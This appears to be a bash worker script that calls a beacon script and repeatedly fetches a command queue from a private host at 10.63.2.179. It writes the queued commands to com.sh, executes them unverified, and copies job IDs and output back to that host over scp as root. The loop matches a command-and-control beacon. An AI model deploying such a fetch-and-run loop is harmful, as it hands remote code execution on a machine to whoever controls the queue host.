#! /bin/bash

cd /opt/fun
./beacon.sh
while [ 1 ]
do
wget --no-parent http://10.63.2.179/work/queue.txt
if [ -s queue.txt ]; then
	cat queue.txt | awk '{print $1}' > work_num.txt
        cat queue.txt | awk '{print $0}' >>work_hist.txt
        cat queue.txt| cut -f 1 -d ' ' --complement > com.sh
        cat work_num.txt | awk '{print "start "$0}'
        scp ./work_num.txt  root@10.63.2.179:/var/www/html/work/item.txt
        #while read line; do wget 10.63.2.179/com/"$line"; done < work_num.txt
        chmod +x com.sh
        ./com.sh
        cat work_num.txt |awk '{print "end "$0}'
        sleep 2
        while read line; do scp ./output.txt root@10.63.2.179:/var/www/html/work/out/"$line".txt; done < work_num.txt
else
	echo "Sleep"
        sleep 30
        ./beacon.sh
fi	
rm -f queue.txt
rm -f com.sh
done
